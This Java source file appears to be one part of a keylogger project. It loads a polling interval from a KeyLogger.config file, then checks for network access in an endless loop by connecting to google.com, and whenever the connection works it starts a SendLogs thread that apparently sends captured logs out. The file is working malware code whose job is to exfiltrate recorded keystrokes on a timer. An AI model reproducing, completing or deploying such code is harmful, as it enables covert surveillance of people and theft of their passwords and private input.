
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.locks.ReentrantLock;
import java.io.FileReader;
import java.io.*;
public class CheckNetwork implements Runnable {
    ReentrantLock re;
    FileReader reader = null;
    CheckNetwork(ReentrantLock re){
        this.re = re;
    }
    public void run(){
        int time;
        StringBuilder stringBuilder = new StringBuilder();
        File tempFile = null;
        try{
            tempFile = new File("..//config//KeyLogger.config");
            reader = new FileReader(tempFile);
            int ch;
            while((ch = reader.read() )!= -1){
                stringBuilder.append((char)ch);
            }
            
        }catch(Exception e){

        }
        String str = stringBuilder.toString();
        str = str.replaceAll("\\s", "");
        int startIndex = str.indexOf("time:\"");
        int endIndex = str.indexOf("\"",startIndex+6);
        StringBuilder times = new StringBuilder(new String(str.substring(startIndex+6, endIndex)));
        str = times.toString();
        time = Integer.parseInt(str);
        URL url;
        URLConnection connection = null;
        Thread t4 = null;
        SendLogs sl = null;
        while(true){
            try{
                url = new URL("http://www.google.com");
                connection  = url.openConnection();
                connection.connect();
                sl = new SendLogs(re);
                t4 = new Thread(sl);
                t4.start();
            } catch(Exception e){
                System.out.println(e);
            }
            try{
                Thread.currentThread().sleep(time*60000);
            }catch(Exception e){
               System.out.println(e);
           }
        }
    }
}